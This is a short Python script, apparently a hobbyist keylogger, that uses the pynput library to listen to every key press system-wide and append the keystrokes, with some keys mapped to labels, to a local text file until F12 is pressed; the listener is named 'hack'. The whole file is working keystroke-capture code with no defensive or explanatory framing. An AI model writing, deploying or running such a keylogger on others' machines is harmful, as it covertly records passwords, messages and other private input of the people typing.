from pynput.keyboard import Listener
import datetime
def nghe(key):
    ke=key
    ke=str(ke)
    ke=ke.replace("'","")
    if ke=="Key.f12":
        raise SystemExit(0)
    if ke=="Key.ctrl_l":
        ke="<ctrl>"
    if ke=="Key.backspace":
        ke="<delete>"
    if ke=="Key.space":
        ke=" "   
    if ke=="Key.enter":
        ke="\n"
    if ke=="Key.alt_l":
        ke="<alt>"
    with open("nghelen/content.txt","a",encoding="utf-8") as f:
        f.write(ke)

    # print(ke)
with Listener (on_press=nghe) as hack:
    hack.join()

